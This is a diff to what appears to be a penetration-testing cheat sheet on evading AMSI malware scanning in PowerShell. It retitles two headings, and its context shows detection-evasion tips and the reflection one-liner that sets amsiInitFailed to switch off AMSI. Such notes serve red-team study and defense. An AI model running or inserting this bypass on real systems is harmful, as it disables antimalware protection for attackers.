@@ -471,6 +471,7 @@ Write-Host("He" + "llo" + "World")
 Write-Host("Hello World")
 ```
 
+### Change the following in scripts/code
 #### Hash of file/code
  - Change Capitalization 
 	 - PowerShell ignores capitalization, AMSI ignored capitalization, but changing your hash is best practice.
@@ -539,7 +540,7 @@ Write-Host("Hello World")
 #### Structure of the code
 - Change methods and lines of code around. 
 
-#### Example of amsi bypass
+#### Example of changing amsi bypass string
 ```
 # Original amsi bypass
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
